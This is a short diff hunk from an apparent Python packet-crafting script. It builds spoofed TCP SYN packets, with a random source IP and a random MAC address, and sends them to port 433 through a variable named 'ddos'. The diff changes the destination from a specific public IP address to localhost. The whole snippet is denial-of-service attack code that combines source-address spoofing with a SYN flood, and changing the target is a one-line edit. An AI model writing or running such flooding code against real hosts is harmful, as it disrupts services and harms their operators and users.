@@ -13,7 +13,7 @@ try:
           source_ip = random_ip()
           dest_port = 433
           ddos = Ether(src=RandMAC()) \
-                     /IP(src=source_ip, dst="62.210.100.5") \
+                     /IP(src=source_ip, dst="127.0.0.1") \
                      /TCP(dport=433, flags="S") \
 
           sendp(ddos, iface="eth0")
